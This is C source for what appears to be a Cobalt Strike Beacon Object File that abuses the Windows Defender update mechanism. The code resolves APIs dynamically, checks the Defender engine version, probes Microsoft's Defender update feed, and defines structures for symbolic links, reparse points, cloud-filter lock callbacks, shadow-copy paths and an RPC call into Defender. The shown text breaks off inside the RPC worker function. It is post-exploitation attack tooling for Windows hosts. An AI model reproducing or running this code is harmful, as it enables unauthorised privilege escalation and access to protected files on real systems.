#define _CRT_SECURE_NO_WARNINGS
#define UNICODE
#define _UNICODE
#define SECURITY_WIN32
#define INITGUID

#include <windows.h>
#include <stdbool.h>
#include <lmcons.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <fdi.h>
#include <fcntl.h>
#include <winternl.h>
#include <conio.h>
#include <shlwapi.h>
#include <ktmw32.h>
#include <initguid.h>
#include <wuapi.h>
#include <ntstatus.h>
#include <aclapi.h>
#ifdef __cplusplus
extern "C" {
#endif
#include "windefend_h.h"
#ifdef BOF
#include "beacon.h"
#endif
#ifdef __cplusplus
}
#endif
#if defined(__GNUC__) && !defined(_declspec)
#define _declspec(x) __declspec(x)
#endif
#if defined(__x86_64__) && !defined(_M_AMD64)
#define _M_AMD64 1
#endif
#include "offreg.h"
#define _NTDEF_
#include <ntsecapi.h>
#include <sddl.h>
#include <userenv.h>
#include <security.h>
#include <intrin.h>    
#include <winver.h>

#ifdef BOF
#define DBG_PRINT(...) BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__)
#define ERR_PRINT(...) BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__)
#define printf(...) DBG_PRINT(__VA_ARGS__)
#define fprintf(stream, ...) ERR_PRINT(__VA_ARGS__)
#define sprintf __ms_sprintf
#define sscanf __ms_sscanf
#define swprintf __ms_swprintf
#endif

#ifndef __has_include
#define __has_include(x) 0
#endif

#if __has_include(<cfapi.h>)
#include <cfapi.h>
#define HAVE_CFAPI 1
#else
#define HAVE_CFAPI 0
#endif

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Cabinet.lib")
#pragma comment(lib, "Wuguid.lib")
#if HAVE_CFAPI
#pragma comment(lib,"CldApi.lib")
#endif
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Version.lib")








static HMODULE g_ntdll = NULL;
static HMODULE g_rpcrt4 = NULL;
static HMODULE g_cabinet = NULL;
static HMODULE g_offreg = NULL;
static HMODULE g_kernel32 = NULL;
static HMODULE g_advapi32 = NULL;
static HMODULE g_ole32 = NULL;
static HMODULE g_oleaut32 = NULL;
static HMODULE g_version = NULL;
static HMODULE g_wininet = NULL;
static HMODULE g_shlwapi = NULL;
static HMODULE g_user32 = NULL;
#if HAVE_CFAPI
static HMODULE g_cldapi = NULL;
#endif

static NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)(
	OUT PHANDLE             pHandle,
	IN ACCESS_MASK          DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PUNICODE_STRING      DestinationName) = NULL;
static NTSTATUS(WINAPI* _NtOpenDirectoryObject)(
	PHANDLE            DirectoryHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	) = NULL;
static NTSTATUS(WINAPI* _NtQueryDirectoryObject)(
	HANDLE  DirectoryHandle,
	PVOID   Buffer,
	ULONG   Length,
	BOOLEAN ReturnSingleEntry,
	BOOLEAN RestartScan,
	PULONG  Context,
	PULONG  ReturnLength
	) = NULL;
static VOID (WINAPI* pRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR) = NULL;
static ULONG (WINAPI* pRtlNtStatusToDosError)(NTSTATUS) = NULL;
static NTSTATUS (NTAPI* pNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG) = NULL;
static NTSTATUS (NTAPI* pNtClose)(HANDLE) = NULL;
static RPC_STATUS (RPC_ENTRY* pRpcStringBindingComposeW)(RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR*) = NULL;
static RPC_STATUS (RPC_ENTRY* pRpcBindingFromStringBindingW)(RPC_WSTR, RPC_BINDING_HANDLE*) = NULL;
static RPC_STATUS (RPC_ENTRY* pRpcStringFreeW)(RPC_WSTR*) = NULL;
static RPC_STATUS (RPC_ENTRY* pUuidCreate)(UUID*) = NULL;
static RPC_STATUS (RPC_ENTRY* pUuidToStringW)(UUID*, RPC_WSTR*) = NULL;
static HFDI (DIAMONDAPI* pFDICreate)(PFNALLOC, PFNFREE, PFNOPEN, PFNREAD, PFNWRITE, PFNCLOSE, PFNSEEK, int, PERF) = NULL;
static WINBOOL (DIAMONDAPI* pFDICopy)(HFDI, char*, char*, int, PFNFDINOTIFY, PFNFDIDECRYPT, void*) = NULL;
static WINBOOL (DIAMONDAPI* pFDIDestroy)(HFDI) = NULL;
static DWORD (WINAPI* pOROpenHive)(PCWSTR, PORHKEY) = NULL;
static DWORD (WINAPI* pORCloseHive)(ORHKEY) = NULL;
static DWORD (WINAPI* pOROpenKey)(ORHKEY, PCWSTR, PORHKEY) = NULL;
static DWORD (WINAPI* pORCloseKey)(ORHKEY) = NULL;
static DWORD (WINAPI* pORQueryInfoKey)(ORHKEY, PWSTR, PDWORD, PDWORD, PDWORD, PDWORD, PDWORD, PDWORD, PDWORD, PDWORD, PFILETIME) = NULL;
static DWORD (WINAPI* pOREnumKey)(ORHKEY, DWORD, PWSTR, PDWORD, PWSTR, PDWORD, PFILETIME) = NULL;
static DWORD (WINAPI* pORGetValue)(ORHKEY, PCWSTR, PCWSTR, PDWORD, PVOID, PDWORD) = NULL;

#define PRIVATE_IMPORT_LIST(X) \
	X(g_ntdll, L"ntdll.dll", NtCreateSymbolicLinkObject, _NtCreateSymbolicLinkObject) \
	X(g_ntdll, L"ntdll.dll", NtOpenDirectoryObject, _NtOpenDirectoryObject) \
	X(g_ntdll, L"ntdll.dll", NtQueryDirectoryObject, _NtQueryDirectoryObject) \
	X(g_ntdll, L"ntdll.dll", RtlInitUnicodeString, pRtlInitUnicodeString) \
	X(g_ntdll, L"ntdll.dll", RtlNtStatusToDosError, pRtlNtStatusToDosError) \
	X(g_ntdll, L"ntdll.dll", NtCreateFile, pNtCreateFile) \
	X(g_ntdll, L"ntdll.dll", NtClose, pNtClose) \
	X(g_rpcrt4, L"rpcrt4.dll", RpcStringBindingComposeW, pRpcStringBindingComposeW) \
	X(g_rpcrt4, L"rpcrt4.dll", RpcBindingFromStringBindingW, pRpcBindingFromStringBindingW) \
	X(g_rpcrt4, L"rpcrt4.dll", RpcStringFreeW, pRpcStringFreeW) \
	X(g_rpcrt4, L"rpcrt4.dll", UuidCreate, pUuidCreate) \
	X(g_rpcrt4, L"rpcrt4.dll", UuidToStringW, pUuidToStringW) \
	X(g_cabinet, L"cabinet.dll", FDICreate, pFDICreate) \
	X(g_cabinet, L"cabinet.dll", FDICopy, pFDICopy) \
	X(g_cabinet, L"cabinet.dll", FDIDestroy, pFDIDestroy) \
	X(g_offreg, L"offreg.dll", OROpenHive, pOROpenHive) \
	X(g_offreg, L"offreg.dll", ORCloseHive, pORCloseHive) \
	X(g_offreg, L"offreg.dll", OROpenKey, pOROpenKey) \
	X(g_offreg, L"offreg.dll", ORCloseKey, pORCloseKey) \
	X(g_offreg, L"offreg.dll", ORQueryInfoKey, pORQueryInfoKey) \
	X(g_offreg, L"offreg.dll", OREnumKey, pOREnumKey) \
	X(g_offreg, L"offreg.dll", ORGetValue, pORGetValue)

#define WINAPI_LIST(X) \
	X(g_kernel32, L"kernel32.dll", CloseHandle, CloseHandle) \
	X(g_kernel32, L"kernel32.dll", CreateDirectoryW, CreateDirectory) \
	X(g_kernel32, L"kernel32.dll", CreateEventW, CreateEvent) \
	X(g_kernel32, L"kernel32.dll", CreateFileW, CreateFile) \
	X(g_kernel32, L"kernel32.dll", CreateThread, CreateThread) \
	X(g_kernel32, L"kernel32.dll", DeleteFileW, DeleteFile) \
	X(g_kernel32, L"kernel32.dll", DeviceIoControl, DeviceIoControl) \
	X(g_kernel32, L"kernel32.dll", ExpandEnvironmentStringsW, ExpandEnvironmentStrings) \
	X(g_kernel32, L"kernel32.dll", FindClose, FindClose) \
	X(g_kernel32, L"kernel32.dll", FindFirstFileW, FindFirstFile) \
	X(g_kernel32, L"kernel32.dll", GetCurrentProcess, GetCurrentProcess) \
	X(g_kernel32, L"kernel32.dll", GetCurrentThreadId, GetCurrentThreadId) \
	X(g_kernel32, L"kernel32.dll", GetExitCodeThread, GetExitCodeThread) \
	X(g_kernel32, L"kernel32.dll", GetFileSizeEx, GetFileSizeEx) \
	X(g_kernel32, L"kernel32.dll", GetLastError, GetLastError) \
	X(g_kernel32, L"kernel32.dll", GetModuleFileNameW, GetModuleFileName) \
	X(g_kernel32, L"kernel32.dll", GetOverlappedResult, GetOverlappedResult) \
	X(g_kernel32, L"kernel32.dll", GetProcessHeap, GetProcessHeap) \
	X(g_kernel32, L"kernel32.dll", GetSystemTime, GetSystemTime) \
	X(g_kernel32, L"kernel32.dll", GetTickCount, GetTickCount) \
	X(g_kernel32, L"kernel32.dll", HeapAlloc, HeapAlloc) \
	X(g_kernel32, L"kernel32.dll", HeapFree, HeapFree) \
	X(g_kernel32, L"kernel32.dll", lstrlenW, lstrlenW) \
	X(g_kernel32, L"kernel32.dll", LockFileEx, LockFileEx) \
	X(g_kernel32, L"kernel32.dll", MoveFileW, MoveFile) \
	X(g_kernel32, L"kernel32.dll", MultiByteToWideChar, MultiByteToWideChar) \
	X(g_kernel32, L"kernel32.dll", OpenThread, OpenThread) \
	X(g_kernel32, L"kernel32.dll", ReadDirectoryChangesW, ReadDirectoryChangesW) \
	X(g_kernel32, L"kernel32.dll", ReadFile, ReadFile) \
	X(g_kernel32, L"kernel32.dll", RemoveDirectoryW, RemoveDirectory) \
	X(g_kernel32, L"kernel32.dll", SetEvent, SetEvent) \
	X(g_kernel32, L"kernel32.dll", SetFileInformationByHandle, SetFileInformationByHandle) \
	X(g_kernel32, L"kernel32.dll", SetLastError, SetLastError) \
	X(g_kernel32, L"kernel32.dll", Sleep, Sleep) \
	X(g_kernel32, L"kernel32.dll", SystemTimeToFileTime, SystemTimeToFileTime) \
	X(g_kernel32, L"kernel32.dll", UnlockFile, UnlockFile) \
	X(g_kernel32, L"kernel32.dll", WaitForMultipleObjects, WaitForMultipleObjects) \
	X(g_kernel32, L"kernel32.dll", WaitForSingleObject, WaitForSingleObject) \
	X(g_kernel32, L"kernel32.dll", WriteFile, WriteFile) \
	X(g_advapi32, L"advapi32.dll", CloseServiceHandle, CloseServiceHandle) \
	X(g_advapi32, L"advapi32.dll", CryptAcquireContextW, CryptAcquireContext) \
	X(g_advapi32, L"advapi32.dll", CryptCreateHash, CryptCreateHash) \
	X(g_advapi32, L"advapi32.dll", CryptDecrypt, CryptDecrypt) \
	X(g_advapi32, L"advapi32.dll", CryptDestroyHash, CryptDestroyHash) \
	X(g_advapi32, L"advapi32.dll", CryptGetHashParam, CryptGetHashParam) \
	X(g_advapi32, L"advapi32.dll", CryptHashData, CryptHashData) \
	X(g_advapi32, L"advapi32.dll", CryptImportKey, CryptImportKey) \
	X(g_advapi32, L"advapi32.dll", CryptReleaseContext, CryptReleaseContext) \
	X(g_advapi32, L"advapi32.dll", CryptSetKeyParam, CryptSetKeyParam) \
	X(g_advapi32, L"advapi32.dll", GetTokenInformation, GetTokenInformation) \
	X(g_advapi32, L"advapi32.dll", IsWellKnownSid, IsWellKnownSid) \
	X(g_advapi32, L"advapi32.dll", OpenProcessToken, OpenProcessToken) \
	X(g_advapi32, L"advapi32.dll", OpenSCManagerW, OpenSCManager) \
	X(g_advapi32, L"advapi32.dll", OpenServiceW, OpenService) \
	X(g_advapi32, L"advapi32.dll", QueryServiceStatusEx, QueryServiceStatusEx) \
	X(g_advapi32, L"advapi32.dll", RegCloseKey, RegCloseKey) \
	X(g_advapi32, L"advapi32.dll", RegGetValueW, RegGetValueW) \
	X(g_advapi32, L"advapi32.dll", RegOpenKeyExW, RegOpenKeyEx) \
	X(g_advapi32, L"advapi32.dll", RegQueryInfoKeyA, RegQueryInfoKeyA) \
	X(g_ole32, L"ole32.dll", CLSIDFromProgID, CLSIDFromProgID) \
	X(g_ole32, L"ole32.dll", CoCreateInstance, CoCreateInstance) \
	X(g_ole32, L"ole32.dll", CoInitialize, CoInitialize) \
	X(g_ole32, L"ole32.dll", CoInitializeSecurity, CoInitializeSecurity) \
	X(g_ole32, L"ole32.dll", CoSetProxyBlanket, CoSetProxyBlanket) \
	X(g_ole32, L"ole32.dll", CoUninitialize, CoUninitialize) \
	X(g_oleaut32, L"oleaut32.dll", SysAllocString, SysAllocString) \
	X(g_oleaut32, L"oleaut32.dll", SysFreeString, SysFreeString) \
	X(g_oleaut32, L"oleaut32.dll", SysStringLen, SysStringLen) \
	X(g_version, L"version.dll", GetFileVersionInfoSizeW, GetFileVersionInfoSizeW) \
	X(g_version, L"version.dll", GetFileVersionInfoW, GetFileVersionInfoW) \
	X(g_version, L"version.dll", VerQueryValueW, VerQueryValueW) \
	X(g_wininet, L"wininet.dll", HttpQueryInfoW, HttpQueryInfo) \
	X(g_wininet, L"wininet.dll", InternetCloseHandle, InternetCloseHandle) \
	X(g_wininet, L"wininet.dll", InternetOpenUrlW, InternetOpenUrl) \
	X(g_wininet, L"wininet.dll", InternetOpenW, InternetOpen) \
	X(g_wininet, L"wininet.dll", InternetReadFile, InternetReadFile) \
	X(g_shlwapi, L"shlwapi.dll", PathFindFileNameW, PathFindFileName)

#if HAVE_CFAPI
#define WINAPI_CFAPI_LIST(X) \
	X(g_cldapi, L"CldApi.dll", CfConnectSyncRoot, CfConnectSyncRoot) \
	X(g_cldapi, L"CldApi.dll", CfDisconnectSyncRoot, CfDisconnectSyncRoot) \
	X(g_cldapi, L"CldApi.dll", CfExecute, CfExecute) \
	X(g_cldapi, L"CldApi.dll", CfRegisterSyncRoot, CfRegisterSyncRoot) \
	X(g_cldapi, L"CldApi.dll", CfUnregisterSyncRoot, CfUnregisterSyncRoot)
#else
#define WINAPI_CFAPI_LIST(X)
#endif

#define DECLARE_WINAPI_PTR(mod, dll, symbol, alias) static decltype(&symbol) p##alias = NULL;
WINAPI_LIST(DECLARE_WINAPI_PTR)
WINAPI_CFAPI_LIST(DECLARE_WINAPI_PTR)

#ifdef CreateDirectory
#undef CreateDirectory
#endif
#ifdef CreateEvent
#undef CreateEvent
#endif
#ifdef CreateFile
#undef CreateFile
#endif
#ifdef DeleteFile
#undef DeleteFile
#endif
#ifdef ExpandEnvironmentStrings
#undef ExpandEnvironmentStrings
#endif
#ifdef GetModuleFileName
#undef GetModuleFileName
#endif
#ifdef MoveFile
#undef MoveFile
#endif
#ifdef RemoveDirectory
#undef RemoveDirectory
#endif
#ifdef CryptAcquireContext
#undef CryptAcquireContext
#endif
#ifdef OpenSCManager
#undef OpenSCManager
#endif
#ifdef OpenService
#undef OpenService
#endif
#ifdef RegOpenKeyEx
#undef RegOpenKeyEx
#endif
#ifdef HttpQueryInfo
#undef HttpQueryInfo
#endif
#ifdef InternetOpenUrl
#undef InternetOpenUrl
#endif
#ifdef InternetOpen
#undef InternetOpen
#endif
#ifdef PathFindFileName
#undef PathFindFileName
#endif

#define RtlInitUnicodeString pRtlInitUnicodeString
#define RtlNtStatusToDosError pRtlNtStatusToDosError
#define NtCreateFile pNtCreateFile
#define NtClose pNtClose
#define RpcStringBindingComposeW pRpcStringBindingComposeW
#define RpcBindingFromStringBindingW pRpcBindingFromStringBindingW
#define RpcStringFreeW pRpcStringFreeW
#define UuidCreate pUuidCreate
#define UuidToStringW pUuidToStringW
#define FDICreate pFDICreate
#define FDICopy pFDICopy
#define FDIDestroy pFDIDestroy
#define OROpenHive pOROpenHive
#define ORCloseHive pORCloseHive
#define OROpenKey pOROpenKey
#define ORCloseKey pORCloseKey
#define ORQueryInfoKey pORQueryInfoKey
#define OREnumKey pOREnumKey
#define ORGetValue pORGetValue
#define CloseHandle pCloseHandle
#define CreateDirectory pCreateDirectory
#define CreateEvent pCreateEvent
#define CreateFile pCreateFile
#define CreateThread pCreateThread
#define DeleteFile pDeleteFile
#define DeviceIoControl pDeviceIoControl
#define ExpandEnvironmentStrings pExpandEnvironmentStrings
#define GetCurrentProcess pGetCurrentProcess
#define GetCurrentThreadId pGetCurrentThreadId
#define GetExitCodeThread pGetExitCodeThread
#define GetFileSizeEx pGetFileSizeEx
#define GetLastError pGetLastError
#define GetModuleFileName pGetModuleFileName
#define GetOverlappedResult pGetOverlappedResult
#define GetProcessHeap pGetProcessHeap
#define GetSystemTime pGetSystemTime
#define GetTickCount pGetTickCount
#define HeapAlloc pHeapAlloc
#define HeapFree pHeapFree
#define lstrlenW plstrlenW
#define LockFileEx pLockFileEx
#define MoveFile pMoveFile
#define MultiByteToWideChar pMultiByteToWideChar
#define OpenThread pOpenThread
#define ReadDirectoryChangesW pReadDirectoryChangesW
#define ReadFile pReadFile
#define RemoveDirectory pRemoveDirectory
#define SetEvent pSetEvent
#define SetFileInformationByHandle pSetFileInformationByHandle
#define SetLastError pSetLastError
#define Sleep pSleep
#define SystemTimeToFileTime pSystemTimeToFileTime
#define UnlockFile pUnlockFile
#define WaitForMultipleObjects pWaitForMultipleObjects
#define WaitForSingleObject pWaitForSingleObject
#define WriteFile pWriteFile
#define CloseServiceHandle pCloseServiceHandle
#define CryptAcquireContext pCryptAcquireContext
#define CryptCreateHash pCryptCreateHash
#define CryptDecrypt pCryptDecrypt
#define CryptDestroyHash pCryptDestroyHash
#define CryptGetHashParam pCryptGetHashParam
#define CryptHashData pCryptHashData
#define CryptImportKey pCryptImportKey
#define CryptReleaseContext pCryptReleaseContext
#define CryptSetKeyParam pCryptSetKeyParam
#define GetTokenInformation pGetTokenInformation
#define IsWellKnownSid pIsWellKnownSid
#define OpenProcessToken pOpenProcessToken
#define OpenSCManager pOpenSCManager
#define OpenService pOpenService
#define QueryServiceStatusEx pQueryServiceStatusEx
#define RegCloseKey pRegCloseKey
#define RegGetValueW pRegGetValueW
#define RegOpenKeyEx pRegOpenKeyEx
#define RegQueryInfoKeyA pRegQueryInfoKeyA
#define CLSIDFromProgID pCLSIDFromProgID
#define CoCreateInstance pCoCreateInstance
#define CoInitialize pCoInitialize
#define CoInitializeSecurity pCoInitializeSecurity
#define CoSetProxyBlanket pCoSetProxyBlanket
#define CoUninitialize pCoUninitialize
#define SysAllocString pSysAllocString
#define SysFreeString pSysFreeString
#define SysStringLen pSysStringLen
#define GetFileVersionInfoSizeW pGetFileVersionInfoSizeW
#define GetFileVersionInfoW pGetFileVersionInfoW
#define VerQueryValueW pVerQueryValueW
#define HttpQueryInfo pHttpQueryInfo
#define InternetCloseHandle pInternetCloseHandle
#define InternetOpenUrl pInternetOpenUrl
#define InternetOpen pInternetOpen
#define InternetReadFile pInternetReadFile
#define PathFindFileName pPathFindFileName
#if HAVE_CFAPI
#define CfConnectSyncRoot pCfConnectSyncRoot
#define CfDisconnectSyncRoot pCfDisconnectSyncRoot
#define CfExecute pCfExecute
#define CfRegisterSyncRoot pCfRegisterSyncRoot
#define CfUnregisterSyncRoot pCfUnregisterSyncRoot
#endif

// Resolve a DLL export, loading the target module on first use.
static FARPROC ResolveProc(HMODULE* module, LPCWSTR dll_name, LPCSTR proc_name)
{
	if (!*module)
		*module = LoadLibraryW(dll_name);
	if (!*module)
		return NULL;
	return GetProcAddress(*module, proc_name);
}

// Load all delayed imports required by the BOF runtime path.
BOOL initializeAPIs(void)
{
	if (g_ntdll && g_rpcrt4 && g_cabinet && g_kernel32 && g_advapi32 && g_ole32 && g_oleaut32 && g_version && g_wininet && g_shlwapi && g_user32)
		return TRUE;

	g_ntdll = LoadLibraryW(L"ntdll.dll");
	if (!g_ntdll)
		return FALSE;
	g_rpcrt4 = LoadLibraryW(L"rpcrt4.dll");
	g_cabinet = LoadLibraryW(L"cabinet.dll");
	g_offreg = LoadLibraryW(L"offreg.dll");
	g_kernel32 = LoadLibraryW(L"kernel32.dll");
	g_advapi32 = LoadLibraryW(L"advapi32.dll");
	g_ole32 = LoadLibraryW(L"ole32.dll");
	g_oleaut32 = LoadLibraryW(L"oleaut32.dll");
	g_version = LoadLibraryW(L"version.dll");
	g_wininet = LoadLibraryW(L"wininet.dll");
	g_shlwapi = LoadLibraryW(L"shlwapi.dll");
	g_user32 = LoadLibraryW(L"user32.dll");
#if HAVE_CFAPI
	g_cldapi = LoadLibraryW(L"CldApi.dll");
#endif
	if (!g_rpcrt4 || !g_cabinet)
		return FALSE;

#define RESOLVE_IMPORTED_PTR(mod, dll, symbol, alias) \
	alias = reinterpret_cast<decltype(alias)>(ResolveProc(&mod, dll, #symbol));
#define RESOLVE_WINAPI_PTR(mod, dll, symbol, alias) \
	p##alias = reinterpret_cast<decltype(p##alias)>(ResolveProc(&mod, dll, #symbol));
	PRIVATE_IMPORT_LIST(RESOLVE_IMPORTED_PTR)
	WINAPI_LIST(RESOLVE_WINAPI_PTR)
	WINAPI_CFAPI_LIST(RESOLVE_WINAPI_PTR)
#undef RESOLVE_IMPORTED_PTR
#undef RESOLVE_WINAPI_PTR

	return _NtCreateSymbolicLinkObject && _NtOpenDirectoryObject &&
		_NtQueryDirectoryObject &&
		pRtlInitUnicodeString && pRtlNtStatusToDosError &&
		pNtCreateFile && pNtClose &&
		pRpcStringBindingComposeW && pRpcBindingFromStringBindingW &&
		pRpcStringFreeW && pUuidCreate && pUuidToStringW &&
		pFDICreate && pFDICopy && pFDIDestroy &&
#define CHECK_WINAPI_PTR(mod, dll, symbol, alias) p##alias &&
		WINAPI_LIST(CHECK_WINAPI_PTR)
#if HAVE_CFAPI
		WINAPI_CFAPI_LIST(CHECK_WINAPI_PTR)
#endif
		TRUE;
#undef CHECK_WINAPI_PTR
}

#ifdef BOF
#ifdef __cplusplus
extern "C"
#endif
int atexit(void (*func)(void))
{
	(void)func;
	return 0;
}
#endif

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))


typedef struct _FILE_DISPOSITION_INFORMATION_EX {
	ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
	UNICODE_STRING Name;
	UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;

typedef struct _REPARSE_DATA_BUFFER {
	ULONG  ReparseTag;
	USHORT ReparseDataLength;
	USHORT Reserved;
	union {
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			ULONG Flags;
			WCHAR PathBuffer[1];
		} SymbolicLinkReparseBuffer;
		struct {
			USHORT SubstituteNameOffset;
			USHORT SubstituteNameLength;
			USHORT PrintNameOffset;
			USHORT PrintNameLength;
			WCHAR PathBuffer[1];
		} MountPointReparseBuffer;
		struct {
			UCHAR  DataBuffer[1];
		} GenericReparseBuffer;
	} DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)





typedef struct WDRPCWorkerThreadArgs
{
	HANDLE hntfythread;
	HANDLE hevent;
	RPC_STATUS res;
	error_status_t errstat;
	error_status_t errstat0;
	error_status_t errstat1;
	wchar_t dirpath[MAX_PATH];
	bool versionMatch;
	DWORD workerTid;
	DWORD workerExitCode;
	LONG stage;
	RPC_STATUS composeStatus;
	RPC_STATUS bindStatus;
	RPC_STATUS rpcStatus0;
	RPC_STATUS rpcStatus1;
} WDRPCWorkerThreadArgs;

typedef struct tagMPCOMPONENT_VERSION {
	ULONGLONG      Version;
	ULARGE_INTEGER UpdateTime;
} MPCOMPONENT_VERSION, * PMPCOMPONENT_VERSION;

typedef struct tagMPVERSION_INFO {
	MPCOMPONENT_VERSION Product;
	MPCOMPONENT_VERSION Service;
	MPCOMPONENT_VERSION FileSystemFilter;
	MPCOMPONENT_VERSION Engine;
	MPCOMPONENT_VERSION ASSignature;
	MPCOMPONENT_VERSION AVSignature;
	MPCOMPONENT_VERSION NISEngine;
	MPCOMPONENT_VERSION NISSignature;
	MPCOMPONENT_VERSION Reserved[4];
} MPVERSION_INFO, * PMPVERSION_INFO;

typedef union Version {
	struct {
		WORD major;
		WORD minor;
		WORD build;
		WORD revision;
	};
	ULONGLONG QuadPart;
} Version;




void* cabbuff2 = NULL;
DWORD cabbuffsz = 0;
typedef struct CabOpArguments {
	
	ULONG index;        
	char* filename;     
	size_t ptroffset;   
	char* buff;         
	DWORD FileSize;     
	CabOpArguments* first; 
	CabOpArguments* next;   
} CabOpArguments;

typedef struct UpdateFiles {
	
	char filename[MAX_PATH]; 
	void* filebuff;          
	DWORD filesz;            
	bool filecreated;        
	UpdateFiles* next;       
} UpdateFiles;




typedef struct cldcallbackctx {
	
	HANDLE hnotifywdaccess;     
	HANDLE hnotifylockcreated;  
	wchar_t filename[MAX_PATH]; 
} cldcallbackctx;

typedef struct LLShadowVolumeNames
{
	
	wchar_t* name;              
	LLShadowVolumeNames* next;  
} LLShadowVolumeNames;

typedef struct cloudworkerthreadargs {
	
	HANDLE hlock;           
	HANDLE hcleanupevent;   
	HANDLE hvssready;       
} cloudworkerthreadargs;

typedef struct shadowcopyfinderargs {
	
	wchar_t* fullvsspath;   
	HANDLE hstopevent;      
} shadowcopyfinderargs;








// Allocate memory for RPC stub marshalling.
void __RPC_FAR* __RPC_USER MIDL_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

// Free memory allocated by RPC stub marshalling.
void __RPC_USER MIDL_user_free(void __RPC_FAR* p)
{
	free(p);
}




UpdateFiles* GetUpdateFiles(int* filecount);
bool TriggerWDForVS(HANDLE hreleaseevent, wchar_t* fullvsspath);
bool IsRunningAsLocalSystem();

// Apply COM proxy security settings used by Windows Update interfaces.
static HRESULT ApplyWUProxySecurity(IUnknown* unk)
{
	if (!unk) {
			return E_POINTER;
	}

	HRESULT hr = CoSetProxyBlanket(
		unk,
		RPC_C_AUTHN_WINNT,
		RPC_C_AUTHZ_NONE,
		NULL,
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_DYNAMIC_CLOAKING);

	return hr;
}

// Probe the direct Defender update feed when Windows Update search is blocked.
static bool CheckForWDUpdatesDirect(wchar_t* updatetitle)
{
	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	wchar_t content_length[64] = { 0 };
	DWORD content_length_size = sizeof(content_length);
	DWORD index = 0;
	bool available = false;

	hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hint) {
			goto cleanup;
	}

	hint2 = InternetOpenUrl(
		hint,
		L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64",
		NULL,
		0,
		INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD,
		0);
	if (!hint2) {
			goto cleanup;
	}

	if (!HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, content_length, &content_length_size, &index)) {
			goto cleanup;
	}

	if (updatetitle)
		wcscpy(updatetitle, L"Microsoft Defender Antivirus platform update available via direct feed");
	available = true;

cleanup:
	if (hint2)
		InternetCloseHandle(hint2);
	if (hint)
		InternetCloseHandle(hint);
	return available;
}









// Read a registry string value into a bounded wide-character buffer.
static void ReadRegSZ(const wchar_t* subkey, const wchar_t* name, wchar_t* buf, DWORD bufcch)
{
	buf[0] = L'\0';
	DWORD sz = bufcch * sizeof(wchar_t);
	RegGetValueW(HKEY_LOCAL_MACHINE, subkey, name, RRF_RT_REG_SZ, NULL, buf, &sz);
}

// Compare the downloaded Defender engine version with the installed engine.
static bool HasMatchingUpdateEngineVersion(const wchar_t* updateDir)
{
	wchar_t runningEng[128] = { 0 };
	ReadRegSZ(L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates",
		L"EngineVersion", runningEng, 128);

	wchar_t updateEngPath[MAX_PATH] = { 0 };
	wcscpy(updateEngPath, updateDir);
	wcscat(updateEngPath, L"\\mpengine.dll");

	DWORD dummy = 0;
	DWORD infoSize = GetFileVersionInfoSizeW(updateEngPath, &dummy);
	if (!runningEng[0] || !infoSize)
		return false;

	bool versionMatch = false;
	void* infoBuffer = malloc(infoSize);
	if (infoBuffer && GetFileVersionInfoW(updateEngPath, 0, infoSize, infoBuffer)) {
		VS_FIXEDFILEINFO* ffi = NULL;
		UINT ffiSize = 0;
		if (VerQueryValueW(infoBuffer, L"\\", (LPVOID*)&ffi, &ffiSize) && ffi) {
			wchar_t updateEngVer[64] = { 0 };
			swprintf(updateEngVer, 64, L"%u.%u.%u.%u",
				HIWORD(ffi->dwFileVersionMS), LOWORD(ffi->dwFileVersionMS),
				HIWORD(ffi->dwFileVersionLS), LOWORD(ffi->dwFileVersionLS));
			versionMatch = updateEngVer[0] && _wcsicmp(runningEng, updateEngVer) == 0;
		}
	}
	if (infoBuffer)
		free(infoBuffer);

	if (versionMatch) {
		printf("[!] Engine version matches (%ws) — newer KB2267602 required.\n", runningEng);
	}

	return versionMatch;
}

// Invoke the Defender RPC update method for the prepared update directory.
void CallWD(WDRPCWorkerThreadArgs* args)
{
	
	if (args) {
		args->stage = 1;
		args->composeStatus = RPC_S_OK;
		args->bindStatus = RPC_S_OK;
		args->rpcStatus0 = RPC_S_OK;
		args->rpcStatus1 = RPC_S_OK;
